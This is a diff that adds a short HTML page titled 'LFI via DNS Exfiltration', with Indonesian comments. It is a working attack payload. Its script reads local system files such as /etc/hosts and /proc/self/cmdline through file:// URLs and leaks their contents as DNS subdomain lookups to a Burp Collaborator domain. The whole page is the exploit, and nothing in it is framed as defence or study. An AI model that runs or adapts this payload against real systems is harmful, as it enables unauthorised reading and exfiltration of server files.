@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>LFI via DNS Exfiltration</title>
+</head>
+<body>
+    <script>
+        // Ganti ini dengan domain Burp Collaborator Anda
+        const collaboratorDomain = "716undj7s7tx9kqkobf7xntp1g78vyjn.oastify.com";
+
+        // Daftar file yang akan dicoba untuk dibaca
+        const filesToRead = [
+            'file:///etc/hostname',
+            'file:///proc/version',
+            'file:///etc/hosts',
+            'file:///proc/self/cmdline'
+        ];
+
+        // Fungsi untuk membersihkan data agar valid sebagai subdomain DNS
+        function sanitizeForDNS(data) {
+            // Hapus spasi dan ganti karakter tidak valid dengan tanda hubung
+            return data.trim().replace(/\s+/g, '-').replace(/[^a-zA-Z0-9.-]/g, '-').substring(0, 63);
+        }
+
+        // Fungsi untuk membocorkan data
+        function exfiltrate(file) {
+            fetch(file)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('File not accessible');
+                    }
+                    return response.text();
+                })
+                .then(data => {
+                    if (data) {
+                        const cleanData = sanitizeForDNS(data);
+                        // Buat permintaan ke subdomain yang berisi konten file
+                        // Ini akan memicu lookup DNS yang bisa kita lihat
+                        fetch(`http://${cleanData}.${collaboratorDomain}`);
+                    }
+                })
+                .catch(error => {
+                    // Jika gagal, kita bisa mengirim sinyal error (opsional)
+                    console.error('Error fetching file:', file, error);
+                });
+        }
+
+        // Coba baca setiap file dalam daftar
+        filesToRead.forEach(exfiltrate);
+    </script>
+</body>
+</html>
